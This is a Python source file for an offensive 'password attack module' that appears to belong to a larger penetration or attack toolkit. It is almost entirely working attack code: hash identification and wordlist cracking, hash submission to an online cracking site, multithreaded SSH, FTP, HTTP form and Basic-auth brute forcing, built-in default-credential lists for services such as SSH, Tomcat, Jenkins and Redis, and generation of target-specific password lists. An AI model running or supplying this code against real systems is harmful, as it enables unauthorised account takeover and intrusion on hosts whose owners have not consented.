"""
password_attacks.py — Ultra Password Attack Module
Features: Hash identification + cracking, SSH/FTP/HTTP brute force,
          credential stuffing, default credentials, wordlist generation,
          common password patterns, online hash lookup
"""

import base64
import hashlib
import itertools
import re
import socket
import string
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple

import requests
import urllib3
urllib3.disable_warnings()

from ui.rich_ui import (
    console, info, warning, error, found, success, section_header, print_summary
)

TIMEOUT    = 8
DELAY      = 0.1
MAX_WORKERS = 20

# ── Hash signatures ───────────────────────────────────────────────────────────
HASH_SIGNATURES = [
    {"name": "MD5",        "regex": r"^[a-f0-9]{32}$",           "hashcat": "0",    "john": "md5"},
    {"name": "SHA1",       "regex": r"^[a-f0-9]{40}$",           "hashcat": "100",  "john": "sha1"},
    {"name": "SHA256",     "regex": r"^[a-f0-9]{64}$",           "hashcat": "1400", "john": "sha256"},
    {"name": "SHA512",     "regex": r"^[a-f0-9]{128}$",          "hashcat": "1700", "john": "sha512"},
    {"name": "SHA384",     "regex": r"^[a-f0-9]{96}$",           "hashcat": "10800","john": "sha384"},
    {"name": "SHA224",     "regex": r"^[a-f0-9]{56}$",           "hashcat": "1300", "john": "sha224"},
    {"name": "MD4",        "regex": r"^[a-f0-9]{32}$",           "hashcat": "900",  "john": "md4"},
    {"name": "NTLM",       "regex": r"^[a-f0-9]{32}$",           "hashcat": "1000", "john": "nt"},
    {"name": "bcrypt",     "regex": r"^\$2[ayb]\$.{56}$",        "hashcat": "3200", "john": "bcrypt"},
    {"name": "MD5 Crypt",  "regex": r"^\$1\$.{8}\$.{22}$",       "hashcat": "500",  "john": "md5crypt"},
    {"name": "SHA512crypt","regex": r"^\$6\$.{8,16}\$.{86}$",    "hashcat": "1800", "john": "sha512crypt"},
    {"name": "SHA256crypt","regex": r"^\$5\$.{8,16}\$.{43}$",    "hashcat": "7400", "john": "sha256crypt"},
    {"name": "WPA/WPA2",   "regex": r"^[a-f0-9]{64}$",           "hashcat": "2500", "john": "wpapsk"},
    {"name": "MySQL323",   "regex": r"^[a-f0-9]{16}$",           "hashcat": "200",  "john": "mysql"},
    {"name": "MySQL4.1",   "regex": r"^\*[A-F0-9]{40}$",         "hashcat": "300",  "john": "mysql-sha1"},
    {"name": "Django MD5", "regex": r"^md5\$.+\$.+$",            "hashcat": "3710", "john": "django"},
    {"name": "Django SHA1","regex": r"^sha1\$.+\$.+$",           "hashcat": "124",  "john": "django"},
    {"name": "Joomla",     "regex": r"^[a-f0-9]{32}:[a-zA-Z0-9]{32}$","hashcat":"11","john":"joomla"},
    {"name": "WordPress",  "regex": r"^\$P\$.{31}$",             "hashcat": "400",  "john": "phpass"},
    {"name": "Drupal",     "regex": r"^\$S\$.{52}$",             "hashcat": "7900", "john": "drupal7"},
    {"name": "LM Hash",    "regex": r"^[a-f0-9]{32}$",           "hashcat": "3000", "john": "lm"},
    {"name": "Base64",     "regex": r"^[A-Za-z0-9+/]{20,}={0,2}$","hashcat":"N/A", "john": "N/A"},
    {"name": "JWT",        "regex": r"^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$","hashcat":"16500","john":"jwt"},
]

# ── Common passwords ──────────────────────────────────────────────────────────
COMMON_PASSWORDS = [
    "123456","password","12345678","qwerty","123456789","12345","1234567",
    "1234567890","admin","letmein","welcome","monkey","dragon","master",
    "abc123","pass","test","login","root","toor","admin123","password1",
    "Password1","Admin@123","admin@123","P@ssw0rd","p@ssword","Pass@123",
    "Welcome1","welcome123","changeme","default","guest","user","pass123",
    "123123","111111","000000","654321","superman","batman","iloveyou",
    "sunshine","princess","football","shadow","michael","jessica","ninja",
    "mustang","access","trustno1","hello","hello123","qwerty123","azerty",
]

# ── Default credentials by service ───────────────────────────────────────────
DEFAULT_CREDS = {
    "ssh":     [("root","root"),("root","toor"),("root","admin"),("admin","admin"),
                ("admin","password"),("pi","raspberry"),("ubuntu","ubuntu"),
                ("user","user"),("root",""),("admin","1234")],
    "ftp":     [("anonymous","anonymous"),("anonymous",""),("admin","admin"),
                ("ftp","ftp"),("root","root"),("admin","password"),("user","user")],
    "mysql":   [("root",""),("root","root"),("root","mysql"),("admin","admin"),
                ("mysql","mysql")],
    "redis":   [("",""),("default",""),("admin","")],
    "mongodb": [("admin","admin"),("",""),("root","root")],
    "http":    [("admin","admin"),("admin","password"),("admin","1234"),
                ("admin","admin123"),("root","root"),("administrator","administrator"),
                ("admin",""),("user","user"),("test","test"),("guest","guest"),
                ("admin","P@ssw0rd"),("admin","Admin@123")],
    "smb":     [("administrator",""),("admin","admin"),("guest",""),
                ("administrator","password")],
    "telnet":  [("admin","admin"),("root","root"),("admin",""),("root","")],
    "vnc":     [("",""),("admin","admin"),("root","root"),("admin","password")],
    "tomcat":  [("admin","admin"),("tomcat","tomcat"),("tomcat","s3cret"),
                ("admin","s3cret"),("manager","manager"),("role1","role1")],
    "jenkins": [("admin","admin"),("jenkins","jenkins"),("admin","password")],
    "grafana": [("admin","admin"),("admin","grafana")],
    "elastic": [("elastic","changeme"),("admin","admin")],
}

# ── Online hash lookup services ───────────────────────────────────────────────
HASH_LOOKUP_SERVICES = [
    "https://md5decrypt.net/Api/api.php?hash={hash}&hash_type=md5&email=deanna_abshire@price.biz&code=API_KEY",
    "https://hashtoolkit.com/reverse-hash/?hash={hash}",
]


def _session() -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})
    return s


# ── Hash identification ───────────────────────────────────────────────────────

def identify_hash(hash_str: str) -> List[Dict]:
    """Identify hash type from string."""
    hash_str = hash_str.strip()
    matches = []
    for sig in HASH_SIGNATURES:
        if re.match(sig["regex"], hash_str, re.I):
            matches.append({
                "name":    sig["name"],
                "hashcat": sig["hashcat"],
                "john":    sig["john"],
            })
    return matches


def _compute_hash(text: str, algo: str) -> str:
    try:
        h = hashlib.new(algo)
        h.update(text.encode())
        return h.hexdigest()
    except Exception:
        return ""


def crack_hash_offline(hash_str: str, hash_type: str = "md5",
                       wordlist: List[str] = None) -> Optional[str]:
    """Try to crack hash using wordlist."""
    wordlist = wordlist or COMMON_PASSWORDS

    algo_map = {
        "md5": "md5", "sha1": "sha1", "sha256": "sha256",
        "sha512": "sha512", "sha384": "sha384", "sha224": "sha224",
        "ntlm": "md4",
    }
    algo = algo_map.get(hash_type.lower(), "md5")

    for word in wordlist:
        if _compute_hash(word, algo) == hash_str.lower():
            return word
        # With common mutations
        for mutation in [word.capitalize(), word.upper(), word + "1",
                        word + "123", word + "!", "@" + word]:
            if _compute_hash(mutation, algo) == hash_str.lower():
                return mutation
    return None


def crack_hash_online(hash_str: str) -> Optional[str]:
    """Try online hash lookup."""
    try:
        # Try crackstation
        r = _session().post(
            "https://crackstation.net/crack.php",
            data={"hash": hash_str, "submit": "Crack Hashes"},
            timeout=TIMEOUT
        )
        m = re.search(r'"answer":"([^"]+)"', r.text)
        if m and m.group(1) != "":
            return m.group(1)
    except Exception:
        pass
    return None


# ── Brute force ───────────────────────────────────────────────────────────────

def _brute_ssh(host: str, port: int, username: str,
               passwords: List[str]) -> Optional[Dict]:
    """SSH brute force."""
    try:
        import paramiko
    except ImportError:
        warning("paramiko not installed — pip install paramiko")
        return None

    for password in passwords:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username,
                          password=password, timeout=5,
                          allow_agent=False, look_for_keys=False)
            client.close()
            return {"username": username, "password": password,
                    "service": "SSH", "host": host, "port": port}
        except paramiko.AuthenticationException:
            pass
        except Exception:
            break
        time.sleep(DELAY)
    return None


def _brute_ftp(host: str, port: int, username: str,
               passwords: List[str]) -> Optional[Dict]:
    """FTP brute force."""
    import ftplib
    for password in passwords:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(username, password)
            ftp.quit()
            return {"username": username, "password": password,
                    "service": "FTP", "host": host, "port": port}
        except ftplib.error_perm:
            pass
        except Exception:
            break
        time.sleep(DELAY)
    return None


def _brute_http(url: str, username: str, password: str,
                method: str = "POST",
                username_field: str = "username",
                password_field: str = "password",
                fail_string: str = "invalid") -> Optional[Dict]:
    """HTTP form brute force."""
    data = {username_field: username, password_field: password}
    try:
        if method == "POST":
            r = _session().post(url, data=data, timeout=TIMEOUT,
                               verify=False, allow_redirects=True)
        else:
            r = _session().get(url, params=data, timeout=TIMEOUT, verify=False)

        body = r.text.lower()
        # Success if fail string NOT in response and logged in
        if (fail_string.lower() not in body and
            r.status_code in (200, 302) and
            any(w in body for w in ["dashboard","welcome","logout","profile","account"])):
            return {"username": username, "password": password,
                    "service": "HTTP", "url": url, "status": r.status_code}
    except Exception:
        pass
    return None


def _brute_http_basic(url: str, username: str, password: str) -> Optional[Dict]:
    """HTTP Basic Auth brute force."""
    try:
        r = _session().get(url, auth=(username, password),
                          timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            return {"username": username, "password": password,
                    "service": "HTTP Basic Auth", "url": url}
    except Exception:
        pass
    return None


def run_brute_force(target: str, service: str = "http",
                    usernames: List[str] = None,
                    passwords: List[str] = None,
                    port: int = None) -> Dict:
    """Run brute force attack."""
    section_header("Brute Force Attack", f"Ultra — Service: {service.upper()}")
    info(f"Target: {target} | Service: {service}")

    usernames = usernames or ["admin", "root", "administrator", "user", "test"]
    passwords = passwords or COMMON_PASSWORDS[:50]
    found_creds: List[Dict] = []

    # Default port
    default_ports = {"ssh": 22, "ftp": 21, "http": 80, "https": 443}
    if not port:
        port = default_ports.get(service, 80)

    info(f"Usernames: {len(usernames)} | Passwords: {len(passwords)}")
    info(f"Total attempts: {len(usernames) * len(passwords)}")

    lock = threading.Lock()

    def _try_cred(combo: Tuple):
        user, pwd = combo
        result = None
        if service == "ssh":
            result = _brute_ssh(target, port, user, [pwd])
        elif service == "ftp":
            result = _brute_ftp(target, port, user, [pwd])
        elif service in ("http", "https"):
            url = f"{service}://{target}:{port}/login"
            result = _brute_http(url, user, pwd)
            if not result:
                result = _brute_http_basic(f"{service}://{target}:{port}/", user, pwd)

        if result:
            with lock:
                found_creds.append(result)
                found(f"[bold red][FOUND][/bold red]  {user}:{pwd}  → {service.upper()}")

    combos = list(itertools.product(usernames, passwords))
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        ex.map(_try_cred, combos)

    print_summary("Brute Force", {
        "Target":       target,
        "Service":      service.upper(),
        "Attempts":     len(combos),
        "Credentials":  len(found_creds),
    })
    return {"credentials": found_creds, "total": len(found_creds)}


# ── Default credentials check ─────────────────────────────────────────────────

def check_default_creds(target: str, services: Dict[str, int] = None) -> Dict:
    """Check default credentials on discovered services."""
    section_header("Default Credentials Check", "Ultra Multi-Service")
    info(f"Target: {target}")

    if not services:
        services = {"http": 80, "ftp": 21, "ssh": 22}

    found_creds: List[Dict] = []
    lock = threading.Lock()

    for service, port in services.items():
        creds = DEFAULT_CREDS.get(service, [])
        info(f"Checking {service.upper()}:{port} — {len(creds)} default credentials")

        for user, pwd in creds:
            result = None
            if service == "ssh":
                result = _brute_ssh(target, port, user, [pwd])
            elif service == "ftp":
                result = _brute_ftp(target, port, user, [pwd])
            elif service in ("http", "https"):
                for path in ["/login", "/admin", "/wp-login.php", "/"]:
                    url = f"{service}://{target}:{port}{path}"
                    result = _brute_http(url, user, pwd)
                    if not result:
                        result = _brute_http_basic(url, user, pwd)
                    if result:
                        break

            if result:
                with lock:
                    found_creds.append(result)
                    found(f"[bold red][DEFAULT CRED][/bold red]  "
                          f"{service.upper()}  {user}:{pwd}")
            time.sleep(DELAY)

    print_summary("Default Credentials", {
        "Services Checked": len(services),
        "Found":            len(found_creds),
    })
    return {"credentials": found_creds}


# ── Wordlist generator ────────────────────────────────────────────────────────

def generate_wordlist(domain: str, keywords: List[str] = None) -> List[str]:
    """Generate target-specific wordlist."""
    words = set(COMMON_PASSWORDS)
    base  = domain.split(".")[0]
    year  = "2024"

    keywords = keywords or [base]
    keywords.append(base)

    for kw in keywords:
        kw = kw.lower()
        words.update([
            kw, kw.capitalize(), kw.upper(),
            kw + "1", kw + "123", kw + "!",
            kw + "@123", kw + "#123",
            kw + year, kw + "2025", kw + "2026",
            kw + "admin", "admin" + kw,
            kw + "pass", kw + "password",
            "@" + kw, kw + "@",
            kw + "01", kw + "001",
        ])

    return sorted(words)


# ── Main entry point ──────────────────────────────────────────────────────────

def run_password_attacks(target: str, scan_results: Dict = None) -> Dict:
    section_header("Password Attack Module", "Hash Crack + Brute Force + Default Creds")
    info(f"Target: {target}")

    all_results = {}

    # Generate wordlist
    info("Generating target-specific wordlist...")
    wordlist = generate_wordlist(target)
    info(f"Wordlist: {len(wordlist)} passwords")

    # Extract services from scan results
    services = {}
    if scan_results:
        for port_data in scan_results.get("tcp_open", []):
            port = port_data.get("port")
            svc  = port_data.get("service", "").lower()
            if "ssh"   in svc: services["ssh"]   = port
            if "ftp"   in svc: services["ftp"]   = port
            if "http"  in svc: services["http"]  = port
            if "https" in svc: services["https"] = port
            if "mysql" in svc: services["mysql"] = port
            if "redis" in svc: services["redis"] = port

    if not services:
        services = {"http": 80, "https": 443}
        # Quick port check
        for svc, port in [("ssh", 22), ("ftp", 21)]:
            try:
                s = socket.create_connection((target, port), timeout=2)
                s.close()
                services[svc] = port
            except Exception:
                pass

    info(f"Services to attack: {services}")

    # Default credentials check
    cred_results = check_default_creds(target, services)
    all_results["default_creds"] = cred_results

    # Brute force HTTP if found
    if "http" in services or "https" in services:
        scheme = "https" if "https" in services else "http"
        port   = services.get(scheme, 443 if scheme == "https" else 80)
        bf_results = run_brute_force(
            target, scheme, passwords=wordlist[:30], port=port
        )
        all_results["brute_force"] = bf_results

    total_creds = (len(cred_results.get("credentials", [])) +
                   len(all_results.get("brute_force", {}).get("credentials", [])))

    print_summary("Password Attacks", {
        "Services Tested": len(services),
        "Wordlist Size":   len(wordlist),
        "Credentials Found": total_creds,
    })

    return all_results
